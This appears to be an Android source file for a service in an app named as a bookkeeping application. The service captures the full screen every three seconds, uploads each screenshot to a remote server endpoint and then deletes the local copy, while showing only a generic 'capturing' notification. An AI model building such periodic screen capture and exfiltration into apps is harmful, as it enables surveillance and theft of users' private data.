package com.example.bookkeepingapplication.services;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import com.example.bookkeepingapplication.MainActivity;
import com.example.bookkeepingapplication.R;
import com.example.bookkeepingapplication.utils.FileUtils;
import com.example.bookkeepingapplication.utils.HttpUtils;
import com.example.bookkeepingapplication.utils.MyApplication;
import com.example.bookkeepingapplication.utils.UrlUtils;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.nio.ByteBuffer;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;


//另一种实现截屏方式，在原有基础上改进
public class ScreenCaptureService extends Service {

    private static final String TAG = "ScreenCaptureService";

    //储存在application中的数据
    private int mResultCode;
    private Intent mResultData;
    private MediaProjectionManager mMediaProjectionManager = null;

    //新建
    private MediaProjection mMediaProjection;
    private ImageReader mImageReader;
    private int windowWidth = 1080;
    private int windowHeight = 1920;
    private int mScreenDensity = 400;
    private VirtualDisplay mVirtualDisplay;
    private Bitmap bmp = null;
    private Bitmap croppedBitmap = null;


    private Timer timer = new Timer();
    private int Time = 1000*3;//周期时间


    public ScreenCaptureService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();

        //用通知表示前台任务
        sendChatMsg();

        mResultCode = ((MyApplication) getApplication()).getResult();
        mResultData = ((MyApplication)getApplication()).getIntent();
        mMediaProjectionManager = ((MyApplication)getApplication()).getMediaProjectionManager();
        mMediaProjection = mMediaProjectionManager.getMediaProjection(mResultCode, mResultData);

        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                System.out.println("99999998");
                Log.d(TAG, "run: aaaaaaaaaaa");
                startGetCapture();
            }
        };
        timer.schedule(timerTask,
                3000,//延迟1秒执行
                Time);//周期时间

//        startGetCapture();

    }

    private void startGetCapture() {
        mImageReader = ImageReader.newInstance(windowWidth, windowHeight, 0x1, 2); //ImageFormat.RGB_565
        mVirtualDisplay = mMediaProjection.createVirtualDisplay("screen-mirror",
                windowWidth, windowHeight, mScreenDensity,       DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mImageReader.getSurface(), null, null);
//                getImage();
        mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader mImageReader) {
                Image image = null;
                try {
                    image = mImageReader.acquireLatestImage();
                    if (image != null) {
                        final Image.Plane[] planes = image.getPlanes();
                        if (planes.length > 0) {
                            final ByteBuffer buffer = planes[0].getBuffer();
                            int pixelStride = planes[0].getPixelStride();
                            int rowStride = planes[0].getRowStride();
                            int rowPadding = rowStride - pixelStride * windowWidth;
                            // create bitmap
                            bmp = Bitmap.createBitmap(windowWidth + rowPadding / pixelStride,
                                    windowHeight, Bitmap.Config.ARGB_8888);
                            bmp.copyPixelsFromBuffer(buffer);
                            croppedBitmap = Bitmap.createBitmap(bmp, 0, 0, windowWidth, windowHeight);

                            String imagePath = saveBitmap(croppedBitmap);
                            uploadImage(imagePath);

                            if (croppedBitmap != null) {
                                croppedBitmap.recycle();
                            }
                            if (bmp != null) {
                                bmp.recycle();
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (image != null) {
                        image.close();
                    }
                    if (mImageReader != null) {
                        mImageReader.close();
                    }
                    if (mVirtualDisplay != null) {
                        mVirtualDisplay.release();
                    }
                    mImageReader.setOnImageAvailableListener(null, null);
//                mProjection.stop();
//                onScreenshotTaskOver();
                }
            }
        }, getBackgroundHandler());

    }

    Handler backgroundHandler;

    private Handler getBackgroundHandler() {
        if (backgroundHandler == null) {
            HandlerThread backgroundThread =
                    new HandlerThread("catwindow", android.os.Process
                            .THREAD_PRIORITY_BACKGROUND);
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
        }
        return backgroundHandler;
    }

    private String saveBitmap(Bitmap bitmap) {
        String pathImage = Environment.getExternalStorageDirectory().getPath()+"/Pictures/";
        String imageName = pathImage + System.currentTimeMillis() + ".jpg";
        Log.d(TAG, "saveBitmap: " + imageName);
        try {
            File fileImage = new File(imageName);
            if(!fileImage.exists()){
                fileImage.createNewFile();
                Log.i(TAG, "image file created");
            }
            FileOutputStream out = new FileOutputStream(fileImage);
            if(out != null) {
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
                out.flush();
                out.close();
                Intent media = new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE);
                Uri contentUri = Uri.fromFile(fileImage);
                media.setData(contentUri);
                this.sendBroadcast(media);
                Log.i(TAG, "screen image saved");
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return imageName;
    }

    //生成一个通知，表示程序当前正在运行
    public void sendChatMsg() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0);
        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        Notification notification;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new NotificationCompat.Builder(this, "chat")
                    .setContentTitle("正在运行")
                    .setContentText("正在截屏...")
                    .setWhen(System.currentTimeMillis())
                    .setSmallIcon(R.drawable.ic_launcher_background)
                    .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_background))
                    .setAutoCancel(false)
                    .setOngoing(true)
                    .setContentIntent(pendingIntent)
                    .build();
        } else {
            notification = new NotificationCompat.Builder(this)
                    .setContentTitle("正在运行")
                    .setContentText("正在截屏...")
                    .setWhen(System.currentTimeMillis())
                    .setSmallIcon(R.drawable.ic_launcher_background)
                    .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_background))
                    .setAutoCancel(false)
                    .setContentIntent(pendingIntent)
                    .build();
        }

        manager.notify(1, notification);
    }

    private void uploadImage(String imagePath) {
        String url = UrlUtils.testUrls + "/upload/image";
        String imageName = System.currentTimeMillis() + ".jpg";
        HttpUtils.doFile(url, imagePath, imageName, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.d(TAG, "onFailure: ");
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String s = response.body().string().trim();
                Log.d(TAG, "onResponse: " + s);
                delete(imagePath);  //将本地文件删除
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        timer.cancel();
    }

    /**
     * 删除文件，可以是文件或文件夹
     *
     * @param delFile 要删除的文件夹或文件名
     * @return 删除成功返回true，否则返回false
     */
    private boolean delete(String delFile) {
        File file = new File(delFile);
        if (!file.exists()) {
            Toast.makeText(getApplicationContext(), "删除文件失败:" + delFile + "不存在！", Toast.LENGTH_SHORT).show();
//            Log.e(TAG, "delete: 删除文件失败:" + delFile + "不存在！");
            return false;
        } else {
            if (file.isFile()) return deleteSingleFile(delFile);
            else
                return deleteDirectory(delFile);
        }
    }

    /**
     * 删除单个文件
     *
     * @param filePath$Name 要删除的文件的文件名
     * @return 单个文件删除成功返回true，否则返回false
     */
    private boolean deleteSingleFile(String filePath$Name) {
        File file = new File(filePath$Name);
        // 如果文件路径所对应的文件存在，并且是一个文件，则直接删除
        if (file.exists() && file.isFile()) {
            if (file.delete()) {
                Log.e("--Method--", "Copy_Delete.deleteSingleFile: 删除单个文件" + filePath$Name + "成功！");
                return true;
            } else {
                Log.e(TAG, "deleteSingleFile: 删除单个文件" + filePath$Name + "失败！");
//                Toast.makeText(getApplicationContext(), "删除单个文件" + filePath$Name + "失败！", Toast.LENGTH_SHORT).show();
                return false;
            }
        } else {
            Log.e(TAG, "deleteSingleFile: 删除单个文件" + filePath$Name + "不存在！");
//            Toast.makeText(getApplicationContext(), "删除单个文件失败：" + filePath$Name + "不存在！", Toast.LENGTH_SHORT).show();
            return false;
        }
    }

    /**
     * 删除目录及目录下的文件
     *
     * @param filePath 要删除的目录的文件路径
     * @return 目录删除成功返回true，否则返回false
     */
    private boolean deleteDirectory(String filePath) { // 如果dir不以文件分隔符结尾，自动添加文件分隔符
        if (!filePath.endsWith(File.separator)) filePath = filePath + File.separator;
        File dirFile = new File(filePath);
        // 如果dir对应的文件不存在，或者不是一个目录，则退出
        if ((!dirFile.exists()) || (!dirFile.isDirectory())) {
            Log.e(TAG, "deleteDirectory: 删除目录失败" + filePath + "不存在！");
//            Toast.makeText(getApplicationContext(), "删除目录失败：" + filePath + "不存在！", Toast.LENGTH_SHORT).show();
            return false;
        }
        boolean flag = true;
        // 删除文件夹中的所有文件包括子目录
        File[] files = dirFile.listFiles();
        for (File file : files) { // 删除子文件
            if (file.isFile()) {
                flag = deleteSingleFile(file.getAbsolutePath());
                if (!flag) break;
            } // 删除子目录
            else if (file.isDirectory()) {
                flag = deleteDirectory(file.getAbsolutePath());
                if (!flag) break;
            }
        }
        if (!flag) {
            Log.e(TAG, "deleteDirectory: 删除目录失败" + filePath + "失败！");
//            Toast.makeText(getApplicationContext(), "删除目录失败！", Toast.LENGTH_SHORT).show();
            return false;
        } // 删除当前目录
        if (dirFile.delete()) {
            Log.e("--Method--", "Copy_Delete.deleteDirectory: 删除目录" + filePath + "成功！");
            return true;
        } else {
            Log.e(TAG, "deleteDirectory: 删除目录：" + filePath + "失败！");
//            Toast.makeText(getApplicationContext(), "删除目录：" + filePath + "失败！", Toast.LENGTH_SHORT).show();
            return false;
        }
    }
}
